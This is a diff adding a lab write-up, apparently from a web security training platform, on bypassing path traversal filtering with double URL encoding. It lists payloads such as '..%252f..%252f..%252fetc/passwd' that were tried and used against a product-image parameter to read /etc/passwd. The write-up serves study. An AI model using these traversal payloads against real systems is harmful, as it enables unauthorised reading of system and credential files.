@@ -1,0 +1,36 @@
+#+title: File path traversal, traversal sequences stripped with superfluous URL-decode
+
+* Table of Contents :toc:
+- [[#lab-contains][Lab Contains]]
+- [[#end-goal][End Goal]]
+- [[#solution][Solution]]
+- [[#payload-to-solve-lab][Payload to solve lab]]
+
+* Lab Contains
+- vulnerability on display of product images
+- block path traversal sequences
+- perform URL-decode before using it
+* End Goal
+- retrieve the contents of ~/etc/passwd~ file
+* Solution
+- Access the lab
+- Open any product image on new tab & intercept the request with burpsuite
+- change file name to some basic payload like
+  - ~../../../etc/passwd~
+    - Not found
+  - ~/etc/passwd~
+    - Not found
+  - ~....//....//....//etc/passwd~
+    - Not found
+- Now try to encode our payload and try
+  - Payload -> ~../../../etc/passwd~
+  - Encode -> ~..%2f..%2f..%2fetc/passwd~
+    - Still not working, hmm! since it use URL-decode that's why it is not working
+    - Encode again: ~..%252f..%252f..%252fetc/passwd~
+      - Awala!! retrieved the contents of ~/etc/passwd~
+* Payload to solve lab
+*Pass traversal sequence double URL-Encoded value*
+
+1. ~../../../etc/passwd~
+   1. ~..%2f..%2f..%2fetc/passwd~
+      1. ~..%252f..%252f..%252fetc/passwd~
